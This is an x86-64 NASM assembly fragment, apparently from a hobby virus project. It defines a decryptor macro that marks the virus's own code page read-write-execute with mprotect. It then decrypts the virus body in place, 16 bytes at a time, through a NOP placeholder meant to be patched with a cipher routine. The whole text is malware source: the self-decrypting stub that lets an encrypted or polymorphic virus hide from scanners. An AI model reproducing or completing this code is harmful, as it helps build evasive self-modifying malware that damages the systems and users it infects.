

extern getpagesize
extern mprotect

; memory protection permission

%define PROT_NONE  0x0
%define PROT_READ  0x1
%define PROT_WRITE 0x2
%define PROT_EXEC  0x4

; opcode for no operation
%define OP_NOP 0x90

; the size of the encrypt and decrypt function
%define FUNC_SIZE 0x10


; this function will take in 2 arguments
; the address of the virus.start and the size of (virus.end - virus.start)
%macro DECRYPTOR_SECTION 2
push rsp
push rbp
push rbx
push r12
push r13
push r14
push r15


call getpagesize
; rax has 0x1000
mov rcx, rax
; save rax for later use when passing to mprotect
sub	rcx, 0x1
not rcx
mov	rdi, %1
and rdi, rcx
; AND them and the result will be stored in rcx
; rdi must hold the page_start address
mov rsi, rax
; rsi must have the page length
mov rdx, 0x7
; read+write+exec = 0x7
call mprotect

; source - destination registers hold the start and end of virus
mov rsi, %1
lea rdi, [rsi+%2]

.decryption_loop:
	; load first 16bytes of memory data to registers
	mov eax, [rsi]
	mov ebx, [rsi+0x4]
	mov ecx, [rsi+0x8]
	mov edx, [rsi+0xC]

.decryption_function:
	times FUNC_SIZE db OP_NOP
	; put back the data to where it was taken from
	mov [rsi], eax
	mov [rsi+0x4], ebx
	mov [rsi+0x8], ecx
	mov [rsi+0xC], edx
	add rsi, 0x10
	; add 10h to rsi, fast forwards rsi to decrypt next 16bytes
	cmp rsi, rdi
	;compare if rsi = rdi, signalling end of decryption
	jne .decryption_loop





pop r15
pop r14
pop r13
pop r12
pop rbx
pop rbp
pop rsp
%endmacro

